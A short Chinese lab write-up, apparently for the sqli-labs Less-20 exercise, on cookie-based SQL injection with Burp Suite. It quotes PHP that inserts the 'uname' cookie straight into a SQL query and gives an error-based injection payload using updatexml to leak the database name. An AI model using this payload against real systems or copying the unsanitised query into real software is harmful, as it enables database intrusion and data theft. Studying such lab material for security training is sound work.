# 使用 Burp Suite 进行 Header Injection

```php
$cookee = $_COOKIE['uname'];
$format = 'D d M Y - H:i:s';
$timestamp = time() + 3600;
echo "<center>";
echo '<br><br><br>';
echo '<img src="../images/Less-20.jpg" />';
echo "<br><br><b>";
echo '<br><font color= "red" font size="4">';	
echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
echo "</font><br>";	
echo '<font color= "cyan" font size="4">';	
echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];			
echo "</font><br>";			
echo '<font color= "#FFFF00" font size = 4 >';
echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
echo '<font color= "orange" font size = 5 >';			
echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
```



```php
echo "<br></font>";
$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
$result=mysqli_query($con1, $sql);
if (!$result)
{
    die('Issue with your mysql: ' . mysqli_error($con1));
}
$row = mysqli_fetch_array($result, MYSQLI_BOTH);
```

由代码片段知变量 \$cookee 可以进行注入，而 \$cookee 变量又是从 \$cookee = \$_COOKIE['uname']; 设置的

故先对网页进行拦截，再修改 cookie 值进行报错注入

```
Cookie: uname=admin' or updatexml(1,concat('~',(select database())),3)#
```

